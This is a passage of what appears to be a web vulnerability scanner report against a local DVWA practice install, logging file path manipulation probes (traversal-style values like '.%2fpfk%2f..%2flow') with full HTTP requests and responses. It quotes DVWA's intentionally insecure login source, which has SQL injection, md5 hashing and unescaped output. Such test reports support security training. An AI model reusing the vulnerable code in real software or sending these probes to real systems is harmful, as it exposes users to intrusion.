#DD0000"&gt;'password'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;md5&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Check&amp;nbsp;the&amp;nbsp;database&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$query&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"SELECT&amp;nbsp;*&amp;nbsp;FROM&amp;nbsp;`users`&amp;nbsp;WHERE&amp;nbsp;user&amp;nbsp;=&amp;nbsp;'&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;nbsp;AND&amp;nbsp;password&amp;nbsp;=&amp;nbsp;'&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&lt;/span&gt;&lt;span style="color: #DD0000"&gt;';"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_query&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;],&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$query&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;or&amp;nbsp;die(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;lt;pre&amp;gt;'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;.&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;is_object&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;]))&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_error&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;])&amp;nbsp;:&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_connect_error&lt;/span&gt;&lt;span style="color: #007700"&gt;())&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;:&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;false&lt;/span&gt;&lt;span style="color: #007700"&gt;))&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;lt;/pre&amp;gt;'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;&amp;amp;&amp;amp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_num_rows&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;==&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;1&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;users&amp;nbsp;details&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$row&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$avatar&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$row&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"avatar"&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Login&amp;nbsp;successful&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;p&amp;gt;Welcome&amp;nbsp;to&amp;nbsp;the&amp;nbsp;password&amp;nbsp;protected&amp;nbsp;area&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;{&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&lt;/span&gt;&lt;span style="color: #007700"&gt;}&lt;/span&gt;&lt;span style="color: #DD0000"&gt;&amp;lt;/p&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;img&amp;nbsp;src=\"&lt;/span&gt;&lt;span style="color: #007700"&gt;{&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$avatar&lt;/span&gt;&lt;span style="color: #007700"&gt;}&lt;/span&gt;&lt;span style="color: #DD0000"&gt;\"&amp;nbsp;/&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;else&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Login&amp;nbsp;failed&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;pre&amp;gt;&amp;lt;br&amp;nbsp;/&amp;gt;Username&amp;nbsp;and/or&amp;nbsp;password&amp;nbsp;incorrect.&amp;lt;/pre&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;is_null&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_close&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;])))&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;false&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;:&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;?&amp;gt;&lt;br /&gt;&lt;/span&gt;<br>&lt;/span&gt;</span><br>&lt;/code&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=<span class="HIGHLIGHT">...%2fbrute</span>&amp;security=low HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:49 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1000<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="29.2.2">29.2.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</span>
<br><a class="PREVNEXT" href="#29.2.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.4.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>security</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./pfk/../low</b> was submitted in the security parameter. This returned the same content as the base request. The payload <b>.../low</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute&amp;security=<span class="HIGHLIGHT">.%2fpfk%2f..%2flow</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:50 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 7875<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;span style="color: #0000BB"&gt;&amp;lt;?php<span class="HIGHLIGHT">&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #007700"&gt;if(&amp;nbsp;isset(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'Login'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;]&amp;nbsp;)&amp;nbsp;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;username&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'username'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;password&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'password'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;md5&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Check&amp;nbsp;the&amp;nbsp;database&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$query&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"SELECT&amp;nbsp;*&amp;nbsp;FROM&amp;nbsp;`users`&amp;nbsp;WHERE&amp;nbsp;user&amp;nbsp;=&amp;nbsp;'&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;nbsp;AND&amp;nbsp;password&amp;nbsp;=&amp;nbsp;'&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&lt;/span&gt;&lt;span style="color: #DD0000"&gt;';"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_query&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;],&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$query&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;or&amp;nbsp;die(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;lt;pre&amp;gt;'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;.&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;is_object&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;]))&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_error&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;])&amp;nbsp;:&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_connect_error&lt;/span&gt;&lt;span style="color: #007700"&gt;())&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;:&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;false&lt;/span&gt;&lt;span style="color: #007700"&gt;))&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&amp;lt;/pre&amp;gt;'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;&amp;amp;&amp;amp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_num_rows&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;==&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;1&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;users&amp;nbsp;details&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$row&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span style="color: #007700"&gt;(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$result&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$avatar&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$row&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"avatar"&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Login&amp;nbsp;successful&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;p&amp;gt;Welcome&amp;nbsp;to&amp;nbsp;the&amp;nbsp;password&amp;nbsp;protected&amp;nbsp;area&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;{&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&lt;/span&gt;&lt;span style="color: #007700"&gt;}&lt;/span&gt;&lt;span style="color: #DD0000"&gt;&amp;lt;/p&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;img&amp;nbsp;src=\"&lt;/span&gt;&lt;span style="color: #007700"&gt;{&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$avatar&lt;/span&gt;&lt;span style="color: #007700"&gt;}&lt;/span&gt;&lt;span style="color: #DD0000"&gt;\"&amp;nbsp;/&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;else&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Login&amp;nbsp;failed&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;echo&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"&amp;lt;pre&amp;gt;&amp;lt;br&amp;nbsp;/&amp;gt;Username&amp;nbsp;and/or&amp;nbsp;password&amp;nbsp;incorrect.&amp;lt;/pre&amp;gt;"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;((&lt;/span&gt;&lt;span style="color: #0000BB"&gt;is_null&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;mysqli_close&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$GLOBALS&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"___mysqli_ston"&lt;/span&gt;&lt;span style="color: #007700"&gt;])))&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;false&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;:&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$___mysqli_res&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;?&amp;gt;&lt;br /&gt;&lt;/span&gt;<br>&lt;/span&gt;</span><br>&lt;/code&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute&amp;security=<span class="HIGHLIGHT">...%2flow</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
